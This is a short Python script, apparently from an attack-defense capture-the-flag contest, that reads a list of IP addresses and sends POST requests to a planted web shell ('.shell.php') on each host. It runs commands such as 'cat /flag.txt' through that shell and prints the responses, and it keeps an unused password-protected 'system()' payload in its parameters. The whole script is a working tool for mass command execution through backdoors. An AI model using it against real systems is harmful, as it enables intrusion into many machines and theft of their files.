#通过
import requests

def main():
    with open('./ip.txt') as fopen:
        data = fopen.readlines()
        data = list(map(lambda ip_temp : ip_temp.replace('\n', '').replace('\r', ''), data))
        #path = ".626b2f6b0e5497a747ae11cbc6c94749.php"
        path = ".shell.php"
        for ip in data:
            url = "http://{0}/{1}".format(ip, path)
            params = {'pass': 'cyber_S_A_L', 'cmd_g': "system('cat /tmp/flag.txt');"}
            data = {"shell":"cat /flag.txt"}
           #response = requests.get(url, params)
            try:
                    response = requests.post(url, data, timeout=3)
                    print(response.text)
            except Exception as e:
                print(e)
            

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(e)